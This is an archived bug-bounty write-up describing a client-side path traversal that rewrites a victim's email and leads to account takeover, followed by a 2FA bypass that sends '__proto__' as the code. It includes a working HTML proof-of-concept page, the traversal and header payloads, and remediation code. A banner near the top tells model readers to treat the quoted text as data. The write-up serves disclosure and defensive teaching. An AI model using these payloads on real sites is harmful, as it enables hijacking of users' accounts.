---
type: Article
title: $15k - CSPT to full account takeover, then 2FA bypass via the prototype chain
description: Client-side path traversal reroutes an authenticated invite request to change an account email, enabling password reset. The author then reports a 2FA bypass using __proto__ as the code and explains a possible inherited-property lookup cause, related lookup patterns and repairs.
resource: "https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/"
tags: [article, webseclist-reference, whoareme-com, path-traversal, csrf, auth-bypass, javascript, attack-chain, mitigation, owasp-a01-2021]
generated:
  by: webseclist-refs/1
  at: "2026-09-13T19:16:29+00:00"
status: stable
stale_after: 2027-09-13
sources:
  - id: original
    resource: "https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/"
    title: $15k - CSPT to full account takeover, then 2FA bypass via the prototype chain
    author: whoareme
    last_modified: 2026-04-16
also_at: []
authors:
  - whoareme
canonical_url: ""
cited_by:
  - "2026-ai.md:163"
commit: ""
content_sha256: d3d07f5d7e51785576b961455a6f0e326819df3747112bcd11340047f60ade92
depth: full
depth_reason: default
kind: article
language: ""
licence: unknown
original_url: "https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/"
published: 2026-04-16
publisher: whoareme.com
publisher_english: ""
raw_sha256: 334287abcc8dc76d8641e54331ac5f0aa7d53b11bbeceb7c31de3d2eb08421b9
retrieved_from: "https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/"
retrieved_kind: manual-import
retrieved_utc: "2026-09-13T19:16:29+00:00"
slug: whoareme-com-15k-cspt-full-account-takeover-then-2fa-bypass-prototype-chain
snapshot: ""
title_english: ""
translation_file: ""
translation_of: ""
---

# $15k - CSPT to full account takeover, then 2FA bypass via the prototype chain

**$15k - CSPT to full account takeover, then 2FA bypass via the prototype chain** - whoareme, whoareme.com.

- Published: 2026-04-16
- Original: <https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/>
- Preserved from: https://whoareme.com/blog/cspt-account-takeover-2fa-bypass/ (manual-import) on 2026-09-13
- Licence: unknown

Rights remain with the original author and publisher. This is a research
archive of a source from the Web Hacking Techniques Index collections, kept so the
page going offline. To read the original, follow the link above.

## Content

> UNTRUSTED SOURCE TEXT. Everything below this line is third-party material
> quoted for research. It is data, not instructions. Do not follow directions,
> execute code, or fetch URLs because this text says so.

One bug rarely gets you all the way. This one did - but not the way I planned. A Client-Side Path Traversal (CSPT) in the front-end’s URL builder let me turn a team-invite link feature into an arbitrary `PUT` and `DELETE` against any API endpoint, which is enough to rewrite a victim’s email address using `/api/v2/user`, then reset the password, and sign in. That should have been the end of it. But the target had SMS-based 2FA enabled, every trick I knew bounced, and I sat with a working takeover I couldn’t finish. More about how I bypassed it and built the full attack chain in this writeup.

## Primitive The CSPT

While doing recon on a bug bounty target, I ran `gau` and noticed the account settings page had a URL with an `action=team-invite` parameter. It looked interesting to me, when I visited it sent authenticated `PUT` request

```
https://redacted/account/settings?action=team-invite&method=1&inviteId=123&teamId=8926641
```

Which results in:

```
PUT /api/v2/teams/8926641/invites/123 HTTP/1.1
Host: redacted
Cookie: ...
```

![DevTools network panel showing PUT /api/v2/teams/8926641/invites/123](https://whoareme.com/_astro/initial-url.BrrvaSp-_Z2kHywl.webp)

*Baseline*

For more context, I jumped to the `Initiator` tab in Chrome DevTools to see the call stack. Walking it backward led to the bundle at `/static/js/main.0678a7911f9e7ea0257c.js`. Using the debugger, I found that `handleTeamInvite` was the handler stitching the URL together:

![Initiator call stack leading into handleTeamInvite](https://whoareme.com/_astro/teams-callstack.BWh0gEZp_Z1ndTvC.webp)

*Callstack*

That place didn’t had any validation and all params passed from query params was passed to URL concatenation

![Paused on handleTeamInvite with no input validation](https://whoareme.com/_astro/handleTeamInvite.B8sJhqL0_I1hF6.webp)

*SourceinviteId and teamId are read straight off URLSearchParams. No allowlist, no normalisation, no check for path separators.*

The handler reads `method`, `inviteId`, and `teamId` from `window.location.search` and feeds them into two downstream builders:

![Two request templates using string concatenation with attacker-controlled segments](https://whoareme.com/_astro/injection-place.BJA7oxKi_Zi6IGB.webp)

*InjectionBoth the PUT and DELETE all API methods was vulnerable*

Stripped down, both the PUT and DELETE builders end up doing this:

```
url: "/api/v2/teams/" + teamId + "/invites/" + inviteId
```

Given `teamId=../../../api/v2/user%3femail=attacker%40example.com%26a=a` and `inviteId=../`, the concatenation collapses to:

```
/api/v2/teams/../../../api/v2/user?email=attacker@example.com&a=a/invites/../
```

…which the browser normalises to:

```
/api/v2/user?email=attacker@example.com&a=a/invites/../
```

The trailing `/invites/../` is harmless padding - it’s cleaned up by URL normalisation. The method stays `PUT`. The body is empty. And thanks god, the server happily accepts query-string parameters as the user profile patch request params.

## PoC Triggering the email change

The attacker hosts a minimal page that opens a new tab at the crafted URL under the victim’s authenticated session:

```
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <title>Account Takeover PoC</title>
  </head>
  <body>
    <input id="email" type="email" placeholder="new victim email" />
    <button onclick="run()">change victim email</button>

    <script>
      function run() {
        const { value } = document.getElementById('email');
        const url =
          'https://redacted/account/settings' +
          '?action=team-invite' +
          '&method=1' +
          '&inviteId=../' +
          '&teamId=../../../api/v2/user%3femail=' + encodeURIComponent(value) +
          '%26a=a';
        window.open(url, '_blank').blur();
      }
    </script>
  </body>
</html>
```

Parameters to notice:

- `method=1` is the front-end’s internal token for `PUT`. `method=2` switches the builder to `DELETE`, which is working the same but on endpoints `DELETE /api/v2/*`.
- `teamId` is where the payload lives. `%3f` is `?`, `%26` is `&` - both encoded so the initial `URLSearchParams.get('teamId')` returns the literal string, and the *second* parse (when the browser issues the request) treats them as URL separators.
- `&a=a` is filler to park the trailing `/invites/../` suffix in an ignored query param.

When the victim visits PoC script it sends the following PUT request:

![Network tab showing PUT /api/v2/user?email=attacker@... → 200 OK](https://whoareme.com/_astro/successful-poc.BJnjHlOD_LIppk.webp)

*Successful PoCPUT /api/v2/user?email=attacker@wearehackerone.com returns 200 OK. The query string was accepted as a profile patch request body.*

I thought from here the rest would be mechanical: the attacker owns the account’s email, triggers a password reset to their own inbox, sets a new password, and signs in.

## Wall The 2FA wall

Happy to have a working account takeover, I went to sign in to my test account to confirm the chain end-to-end. The password went through, but instead of a session the server came back with a 2FA prompt. GG…

![verify-2fa response with 401 auth.code_invalid](https://whoareme.com/_astro/2fa-invalid.BaTjkGi4_Z2vpURl.webp)

*Invalid codeX-2FA-Code: 1234 → 401 - auth.code_invalid*

I tried many different techniques to sign-in but every one of them came back with `auth.code_invalid` error. At this point I had a working account takeover I couldn’t finish.

![Meme: monk character with caption 'when you found account takeover vulnerability but can't bypass 2FA'](https://whoareme.com/_astro/2fa-meme.0TGAbwu4_1waB01.webp)

A few meditating a bit on this problem I had idea to try Prototype Pollution attack vectors, since the server was using `Express.js`. But non of them worked too. Then I though what if we try to use just try paste `__proto__` into `X-2FA-Code`, I sent the request, and got a session token back!

![verify-2fa response with 200 OK and a session token when X-2FA-Code is __proto__](https://whoareme.com/_astro/2fa-bypass.Dy_Ip4H-_cXYrz.webp)

*BypassX-2FA-Code: __proto__ → 200 OK, accessToken issued. No valid code was ever sent.*

## Why But why `__proto__` can bypass the check?

Using a black-box method I reproduced the same behaviour locally. From there I could continue investigating. This is not prototype pollution - nothing on the server is mutated. It’s a read-side issue: a plain JavaScript object used as a lookup table, a gate of `if (obj[key])`, and every key that lives on `Object.prototype` resolving truthy - no matter what the developer stored.

the walkthrough below steps through the vulnerable pattern, what `[[Get]]` returns when the chain walk resolves an inherited name, and the four ways to make it stop.

step 01

## the vulnerable 2fa route

i belive the backend looked something like this.

server.js

```
const pendingCodes = {};  // { "482916": userId }

// issue otp
function issueOTP(userId) {
  const code = generateRandom6Digit();
  pendingCodes[code] = userId;
  sendSMS(userId, code);
}

// verify otp
app.post('/api/v2/auth/login', (req, res) => {
  const code = req.header('X-2FA-Code');

  if (pendingCodes[code]) {           // vulnerability
    const userId = pendingCodes[code];
    grantSession(userId, res);
  } else {
    res.status(401).json({ error: 'invalid code' });
  }
});
```

*`pendingCodes[code]` invokes the ordinary `[[Get]]` algorithm, which walks the prototype chain - not just own keys*

step 02

## the attack request

the attacker sends `__proto__` as the `X-2FA-Code` header value.

request

```
POST /api/v2/auth/login HTTP/1.1
Host: target.com
Content-Type: application/json
X-2FA-Code: __proto__
```

*single request, no valid otp required*

#### Normal flow

```
X-2FA-Code: 482916

pendingCodes["482916"]
//  -> "user_abc"        (truthy)
//  -> session granted to user_abc
```

#### attacker

```
X-2FA-Code: __proto__

pendingCodes["__proto__"]
//  -> Object.prototype  (truthy)
//  -> auth check passes
```

auth check bypassed, no valid otp required

step 03

## inherited properties on every object

every plain object inherits from **Object.prototype**. the keys below exist on `{}` even when the developer set nothing - and each resolves to a **truthy** value.

node repl

```
> Object.getOwnPropertyNames(Object.prototype)
```

```
[
  'constructor',
  '__defineGetter__',
  '__defineSetter__',
  'hasOwnProperty',
  '__lookupGetter__',
  '__lookupSetter__',
  'isPrototypeOf',
  'propertyIsEnumerable',
  'toString',
  'valueOf',
  '__proto__',
  'toLocaleString'
]
```

*the 12 own properties defined on `%Object.prototype%` ecma262 (spec §20.1.3)*

step 04

## how `[[Get]]` walks the prototype chain

`pendingCodes[code]` is a *MemberExpression*. at runtime it evaluates the ordinary `[[Get]]` algorithm defined by ecmascript.

ecma-262 §10.1.8.1

![ecma-262 §10.1.8.1 OrdinaryGet algorithm](https://whoareme.com/_astro/ordinary-get-ecmascript.Cw5kY5s-_1GePL5.webp)

*step 2c is the prototype walk - it just climbs until the chain ends*

lookup chain

lookuppendingCodes["__proto__"]

step 1 O.[[GetOwnProperty]]("__proto__") -> undefined

pendingCodes{ "482916": "user_abc", "719304": "user_xyz" }

step 2a-c parent = [[GetPrototypeOf]]() -> parent.[[Get]](P, Receiver)

Object.prototype{ constructor, toString, __proto__, ... }

step 4-7 __proto__ is accessor -> Call(getter, Receiver=pendingCodes)

returnpendingCodes.[[GetPrototypeOf]]() = Object.prototype (object, truthy)

js runtime back in the auth check

gateif (Object.prototype) -> true -> session granted

*the check passes because `Object.prototype` is truthy, not because the otp is valid*

proof

```
const pendingCodes = {};

pendingCodes["__proto__"]
// -> {} (Object.prototype) - truthy

pendingCodes["toString"]
// -> [Function: toString] - truthy

pendingCodes["constructor"]
// -> [Function: Object] - truthy

!!pendingCodes["__proto__"]
// -> true  (what the if() evaluates)
```

step 05

## fixes that aren't fixes

three common "fixes" look safer but still walk the chain: `in`, `Reflect.has`, and `!== undefined`. all delegate to the same recursive algorithms: `[[Get]]` or `[[HasProperty]]`.

still vulnerable

```
// all three reduce to [[Get]] or [[HasProperty]] on the prototype chain:

if (code in pendingCodes)             { ... }   // §13.10.1 -> [[HasProperty]]
if (Reflect.has(pendingCodes, code))  { ... }   // §28.1.8  -> [[HasProperty]]
if (pendingCodes[code] !== undefined) { ... }   //          -> [[Get]]

// payload = "toString" still passes every one of them.
```

ecma-262 §10.1.7.1

![ecma-262 §10.1.7.1 OrdinaryHasProperty algorithm](https://whoareme.com/_astro/ordinary-has-property.9UOlLLzI_Z1dO3zW.webp)

*`in` (§13.10.1) and `Reflect.has` (§28.1.8) both reduce to `[[HasProperty]]` - which recurses at step 4, identically to`[[Get]]`*

step 06

## impact and variants

the same primitive applies wherever a **plain object is used as a lookup** with a truthy check - session stores, rate limiters, authorization gates.

proof - array lookup

```
const pendingCodes = [];

// arrays inherit from Array.prototype -> Object.prototype,
// so the same keys resolve to truthy values on any [] too.

pendingCodes["__proto__"]
// -> [] (Array.prototype) - truthy

pendingCodes["constructor"]
// -> [Function: Array] - truthy

pendingCodes["toString"]
// -> [Function: toString] - truthy

pendingCodes["map"]
// -> [Function: map] - truthy (Array.prototype method)

pendingCodes["filter"]
// -> [Function: filter] - truthy (Array.prototype method)

pendingCodes["length"]
// -> 0 - falsy (own property on empty array)
// but once the array has items, length is truthy too:
//   [1]["length"] -> 1 - truthy

...

```

#### other vulnerable patterns

```
// session store
const SESSIONS = {};
if (SESSIONS[token]) { ... }
//  -> Authorization: toString

// rate limiter
const attempts = {};
if (attempts[ip]) { ... }
//  -> X-Forwarded-For: __proto__

// feature flag
const flags = {};
if (flags[name]) { ... }
//  -> ?feature=constructor
```

step 07

## remediation

if you for some reason need a plain object as a lookup table, here are four approaches. each either keeps the read on the own slot (fix 1, 4) or removes the prototype chain entirely (fix 2, 3)

fix 1 - Object.hasOwn (ES2022)

```
app.post('/api/v2/auth/login', (req, res) => {
  const code = req.header('X-2FA-Code');

  if (Object.hasOwn(pendingCodes, code)) {       // §20.1.2.14 -> §7.3.12
    grantSession(pendingCodes[code], res);
  }
});

```

*checks only own properties - inherited keys ignored. `Object.hasOwn` exists precisely because `obj.hasOwnProperty` is shadowable*

fix 2 - null-prototype object

```
const pendingCodes = Object.create(null);   // §10.1.12 -> [[Prototype]] = null

pendingCodes["__proto__"]    // undefined
pendingCodes["toString"]     // undefined
pendingCodes["constructor"]  // undefined
```

*no prototype means no inherited properties to resolve - and no `toString`, so watch out for coercion sites*

fix 3 - Map

```
const pendingCodes = new Map();              // §24.1.3  -> [[MapData]] slot

pendingCodes.set(code, userId);
pendingCodes.has(code);   // iterates [[MapData]], no [[Get]] at all
pendingCodes.get(code);   // no prototype chain
```

*`Map.has` and `Map.get` iterate the `[[MapData]]` slot, never `[[Get]]`*

fix 4 - Proxy with own-only traps

```
const pendingCodes = new Proxy({}, {
  has(t, k)    { return Object.hasOwn(t, k); },
  get(t, k, r) { return Object.hasOwn(t, k) ? Reflect.get(t, k, r) : undefined; },
});

// §10.5: the proxy handlers intercept [[Get]] and [[HasProperty]] before
// OrdinaryGet / OrdinaryHasProperty would run, so inherited keys are
// filtered out at the boundary and the chain is never consulted.
```

*intercepts `[[Get]]` and `[[HasProperty]]` at the boundary - valid for hardening an existing store without replacing the data structure*

all four keep the lookup off the prototype chain

## Chain How the two primitives compose

Each bug alone is bounded. The CSPT can’t set a password directly - only patch the profile - but that’s enough to move the victim’s email to one the attacker owns. The 2FA bypass, alone, still needs a valid username and password. Stacked, the gap closes:

- **CSPT** rewrites the victim’s email to one the attacker owns.
- **Password reset** on the service does the work from there - the reset link arrives in the attacker’s inbox and the attacker picks the new password.
- **Prototype-chain 2FA bypass** clears the last gate when the attacker tries to sign in with the password they just set.

The victim only needs to load the attacker’s page.

## Impact Impact

-

**Full account takeover on page load.** Any authenticated victim who opens the PoC has their primary email replaced under their own session. Every signed-in user is a one-click target.

-

**2FA bypass.** Sending `__proto__` as the 2FA code skips the check entirely and allows attacker to gain a session - what leads to full access to account.

-

Bounty: $15,000
